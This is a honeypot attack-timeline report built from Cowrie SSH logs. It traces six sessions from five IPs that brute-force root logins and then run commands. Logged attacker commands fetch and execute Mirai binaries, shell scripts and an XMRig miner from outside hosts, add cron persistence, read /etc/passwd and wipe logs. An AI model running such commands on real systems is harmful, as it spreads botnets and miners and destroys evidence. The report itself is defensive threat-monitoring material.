# Attack Timeline

Sessions: **6** | Events: **66** | Attackers: **5**

## Global Chronology

| Timestamp (UTC) | Attacker IP | Session | Type | Event | Detail |
|---|---|---|---|---|---|
| 2026-03-01T08:12:01.120Z | `185.220.101.45` | `a1b2c3d4e5f6` | iot_botnet_propagation | cowrie.session.connect | New connection: 185.220.101.45:48122 (10.0.0.50:2222) [session: a1b2c3d4e5f6] |
| 2026-03-01T08:12:01.340Z | `185.220.101.45` | `a1b2c3d4e5f6` | iot_botnet_propagation | cowrie.client.version | Remote SSH version: SSH-2.0-libssh2_1.10.0 |
| 2026-03-01T08:12:02.010Z | `185.220.101.45` | `a1b2c3d4e5f6` | iot_botnet_propagation | cowrie.login.failed | root/**** |
| 2026-03-01T08:12:02.510Z | `185.220.101.45` | `a1b2c3d4e5f6` | iot_botnet_propagation | cowrie.login.failed | root/****** |
| 2026-03-01T08:12:03.010Z | `185.220.101.45` | `a1b2c3d4e5f6` | iot_botnet_propagation | cowrie.login.failed | admin/***** |
| 2026-03-01T08:12:03.520Z | `185.220.101.45` | `a1b2c3d4e5f6` | iot_botnet_propagation | cowrie.login.failed | root/******** |
| 2026-03-01T08:12:04.020Z | `185.220.101.45` | `a1b2c3d4e5f6` | iot_botnet_propagation | cowrie.login.failed | ubuntu/****** |
| 2026-03-01T08:12:04.510Z | `185.220.101.45` | `a1b2c3d4e5f6` | iot_botnet_propagation | cowrie.login.failed | pi/********* |
| 2026-03-01T08:12:05.100Z | `185.220.101.45` | `a1b2c3d4e5f6` | iot_botnet_propagation | cowrie.login.success | root/******** |
| 2026-03-01T08:12:05.200Z | `185.220.101.45` | `a1b2c3d4e5f6` | iot_botnet_propagation | cowrie.session.params |  |
| 2026-03-01T08:12:06.300Z | `185.220.101.45` | `a1b2c3d4e5f6` | iot_botnet_propagation | cowrie.command.input | uname -a |
| 2026-03-01T08:12:07.100Z | `185.220.101.45` | `a1b2c3d4e5f6` | iot_botnet_propagation | cowrie.command.input | cat /etc/passwd |
| 2026-03-01T08:12:08.400Z | `185.220.101.45` | `a1b2c3d4e5f6` | iot_botnet_propagation | cowrie.command.input | wget http://185.220.101.45/bins/mirai.x86 -O /tmp/.x |
| 2026-03-01T08:12:09.800Z | `185.220.101.45` | `a1b2c3d4e5f6` | iot_botnet_propagation | cowrie.session.file_download | http://185.220.101.45/bins/mirai.x86 |
| 2026-03-01T08:12:10.200Z | `185.220.101.45` | `a1b2c3d4e5f6` | iot_botnet_propagation | cowrie.command.input | chmod +x /tmp/.x |
| 2026-03-01T08:12:11.000Z | `185.220.101.45` | `a1b2c3d4e5f6` | iot_botnet_propagation | cowrie.command.input | /tmp/.x |
| 2026-03-01T08:12:14.500Z | `185.220.101.45` | `a1b2c3d4e5f6` | iot_botnet_propagation | cowrie.session.closed | Connection lost after 13 seconds |
| 2026-03-01T09:45:22.010Z | `45.33.32.156` | `b2c3d4e5f6a7` | cryptominer_deployment | cowrie.session.connect | New connection: 45.33.32.156:39110 (10.0.0.50:2222) [session: b2c3d4e5f6a7] |
| 2026-03-01T09:45:22.200Z | `45.33.32.156` | `b2c3d4e5f6a7` | cryptominer_deployment | cowrie.client.version | Remote SSH version: SSH-2.0-Paramiko_2.11.0 |
| 2026-03-01T09:45:22.800Z | `45.33.32.156` | `b2c3d4e5f6a7` | cryptominer_deployment | cowrie.login.failed | root/**** |
| 2026-03-01T09:45:23.200Z | `45.33.32.156` | `b2c3d4e5f6a7` | cryptominer_deployment | cowrie.login.failed | root/******** |
| 2026-03-01T09:45:23.900Z | `45.33.32.156` | `b2c3d4e5f6a7` | cryptominer_deployment | cowrie.login.success | root/******** |
| 2026-03-01T09:45:25.100Z | `45.33.32.156` | `b2c3d4e5f6a7` | cryptominer_deployment | cowrie.command.input | whoami |
| 2026-03-01T09:45:26.300Z | `45.33.32.156` | `b2c3d4e5f6a7` | cryptominer_deployment | cowrie.command.input | free -m |
| 2026-03-01T09:45:27.500Z | `45.33.32.156` | `b2c3d4e5f6a7` | cryptominer_deployment | cowrie.command.input | curl -s http://45.33.32.156/xmrig.tar.gz \| tar xz -C /tmp |
| 2026-03-01T09:45:29.100Z | `45.33.32.156` | `b2c3d4e5f6a7` | cryptominer_deployment | cowrie.session.file_download | http://45.33.32.156/xmrig.tar.gz |
| 2026-03-01T09:45:30.200Z | `45.33.32.156` | `b2c3d4e5f6a7` | cryptominer_deployment | cowrie.command.input | /tmp/xmrig -o pool.minexmr.com:443 -u 44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs... |
| 2026-03-01T09:45:32.000Z | `45.33.32.156` | `b2c3d4e5f6a7` | cryptominer_deployment | cowrie.command.input | crontab -l |
| 2026-03-01T09:45:33.400Z | `45.33.32.156` | `b2c3d4e5f6a7` | cryptominer_deployment | cowrie.command.input | echo '* * * * * /tmp/xmrig -o pool.minexmr.com:443' \| crontab - |
| 2026-03-01T09:45:35.000Z | `45.33.32.156` | `b2c3d4e5f6a7` | cryptominer_deployment | cowrie.session.closed | Connection lost after 13 seconds |
| 2026-03-01T11:02:10.050Z | `103.149.172.88` | `c3d4e5f6a7b8` | iot_botnet_propagation | cowrie.session.connect | New connection: 103.149.172.88:52001 (10.0.0.50:2223) [session: c3d4e5f6a7b8] |
| 2026-03-01T11:02:11.100Z | `103.149.172.88` | `c3d4e5f6a7b8` | iot_botnet_propagation | cowrie.login.failed | admin/***** |
| 2026-03-01T11:02:11.600Z | `103.149.172.88` | `c3d4e5f6a7b8` | iot_botnet_propagation | cowrie.login.failed | support/******* |
| 2026-03-01T11:02:12.200Z | `103.149.172.88` | `c3d4e5f6a7b8` | iot_botnet_propagation | cowrie.login.success | root/******** |
| 2026-03-01T11:02:13.000Z | `103.149.172.88` | `c3d4e5f6a7b8` | iot_botnet_propagation | cowrie.command.input | busybox wget http://103.149.172.88/l.sh -O- \| sh |
| 2026-03-01T11:02:14.500Z | `103.149.172.88` | `c3d4e5f6a7b8` | iot_botnet_propagation | cowrie.session.file_download | http://103.149.172.88/l.sh |
| 2026-03-01T11:02:15.200Z | `103.149.172.88` | `c3d4e5f6a7b8` | iot_botnet_propagation | cowrie.command.input | cd /tmp; wget http://103.149.172.88/bot.arm7; chmod 777 bot.arm7; ./bot.arm7 |
| 2026-03-01T11:02:16.800Z | `103.149.172.88` | `c3d4e5f6a7b8` | iot_botnet_propagation | cowrie.session.file_download | http://103.149.172.88/bot.arm7 |
| 2026-03-01T11:02:18.000Z | `103.149.172.88` | `c3d4e5f6a7b8` | iot_botnet_propagation | cowrie.session.closed | Connection lost after 8 seconds |
| 2026-03-01T14:18:44.000Z | `198.51.100.77` | `d4e5f6a7b8c9` | manual_reconnaissance | cowrie.session.connect | New connection: 198.51.100.77:44821 (10.0.0.50:2222) [session: d4e5f6a7b8c9] |
| 2026-03-01T14:18:44.200Z | `198.51.100.77` | `d4e5f6a7b8c9` | manual_reconnaissance | cowrie.client.version | Remote SSH version: SSH-2.0-OpenSSH_8.9p1 |
| 2026-03-01T14:18:50.500Z | `198.51.100.77` | `d4e5f6a7b8c9` | manual_reconnaissance | cowrie.login.success | root/******** |
| 2026-03-01T14:18:55.000Z | `198.51.100.77` | `d4e5f6a7b8c9` | manual_reconnaissance | cowrie.command.input | ls -la |
| 2026-03-01T14:19:02.000Z | `198.51.100.77` | `d4e5f6a7b8c9` | manual_reconnaissance | cowrie.command.input | ps aux |
| 2026-03-01T14:19:15.000Z | `198.51.100.77` | `d4e5f6a7b8c9` | manual_reconnaissance | cowrie.command.input | history |
| 2026-03-01T14:19:28.000Z | `198.51.100.77` | `d4e5f6a7b8c9` | manual_reconnaissance | cowrie.command.input | netstat -antp |
| 2026-03-01T14:19:45.000Z | `198.51.100.77` | `d4e5f6a7b8c9` | manual_reconnaissance | cowrie.command.input | cat /proc/cpuinfo |
| 2026-03-01T14:20:10.000Z | `198.51.100.77` | `d4e5f6a7b8c9` | manual_reconnaissance | cowrie.command.input | find / -name '*.conf' 2>/dev/null \| head |
| 2026-03-01T14:20:40.000Z | `198.51.100.77` | `d4e5f6a7b8c9` | manual_reconnaissance | cowrie.command.input | exit |
| 2026-03-01T14:20:41.000Z | `198.51.100.77` | `d4e5f6a7b8c9` | manual_reconnaissance | cowrie.session.closed | Connection lost after 117 seconds |
| 2026-03-01T16:05:01.000Z | `91.219.237.12` | `e5f6a7b8c9d0` | credential_stuffing | cowrie.session.connect | New connection: 91.219.237.12:33990 (10.0.0.50:2222) [session: e5f6a7b8c9d0] |
| 2026-03-01T16:05:01.400Z | `91.219.237.12` | `e5f6a7b8c9d0` | credential_stuffing | cowrie.login.failed | root/**** |
| 2026-03-01T16:05:01.700Z | `91.219.237.12` | `e5f6a7b8c9d0` | credential_stuffing | cowrie.login.failed | test/**** |
| 2026-03-01T16:05:02.000Z | `91.219.237.12` | `e5f6a7b8c9d0` | credential_stuffing | cowrie.login.failed | oracle/****** |
| 2026-03-01T16:05:02.300Z | `91.219.237.12` | `e5f6a7b8c9d0` | credential_stuffing | cowrie.login.failed | user/**** |
| 2026-03-01T16:05:02.600Z | `91.219.237.12` | `e5f6a7b8c9d0` | credential_stuffing | cowrie.login.failed | ftp/*** |
| 2026-03-01T16:05:02.900Z | `91.219.237.12` | `e5f6a7b8c9d0` | credential_stuffing | cowrie.login.failed | guest/***** |
| 2026-03-01T16:05:03.200Z | `91.219.237.12` | `e5f6a7b8c9d0` | credential_stuffing | cowrie.login.failed | mysql/***** |
| 2026-03-01T16:05:03.500Z | `91.219.237.12` | `e5f6a7b8c9d0` | credential_stuffing | cowrie.login.failed | postgres/******** |
| 2026-03-01T16:05:04.000Z | `91.219.237.12` | `e5f6a7b8c9d0` | credential_stuffing | cowrie.session.closed | Connection lost after 3 seconds |
| 2026-03-02T02:11:00.000Z | `185.220.101.45` | `f6a7b8c9d0e1` | malware_download | cowrie.session.connect | New connection: 185.220.101.45:49100 (10.0.0.50:2222) [session: f6a7b8c9d0e1] |
| 2026-03-02T02:11:01.500Z | `185.220.101.45` | `f6a7b8c9d0e1` | malware_download | cowrie.login.success | root/******** |
| 2026-03-02T02:11:02.500Z | `185.220.101.45` | `f6a7b8c9d0e1` | malware_download | cowrie.command.input | wget http://malware-cdn.example.invalid/dropper.sh -O /var/tmp/d.sh; sh /var/... |
| 2026-03-02T02:11:04.000Z | `185.220.101.45` | `f6a7b8c9d0e1` | malware_download | cowrie.session.file_download | http://malware-cdn.example.invalid/dropper.sh |
| 2026-03-02T02:11:05.000Z | `185.220.101.45` | `f6a7b8c9d0e1` | malware_download | cowrie.command.input | iptables -F; rm -rf /var/log/* |
| 2026-03-02T02:11:07.000Z | `185.220.101.45` | `f6a7b8c9d0e1` | malware_download | cowrie.session.closed | Connection lost after 7 seconds |

## By Attacker

### `103.149.172.88`
- **2026-03-01T11:02:10.050Z → 2026-03-01T11:02:18.000Z** — `iot_botnet_propagation` (session `c3d4e5f6a7b8`, 9 events)

### `185.220.101.45`
- **2026-03-01T08:12:01.120Z → 2026-03-01T08:12:14.500Z** — `iot_botnet_propagation` (session `a1b2c3d4e5f6`, 17 events)
- **2026-03-02T02:11:00.000Z → 2026-03-02T02:11:07.000Z** — `malware_download` (session `f6a7b8c9d0e1`, 6 events)

### `198.51.100.77`
- **2026-03-01T14:18:44.000Z → 2026-03-01T14:20:41.000Z** — `manual_reconnaissance` (session `d4e5f6a7b8c9`, 11 events)

### `45.33.32.156`
- **2026-03-01T09:45:22.010Z → 2026-03-01T09:45:35.000Z** — `cryptominer_deployment` (session `b2c3d4e5f6a7`, 13 events)

### `91.219.237.12`
- **2026-03-01T16:05:01.000Z → 2026-03-01T16:05:04.000Z** — `credential_stuffing` (session `e5f6a7b8c9d0`, 10 events)
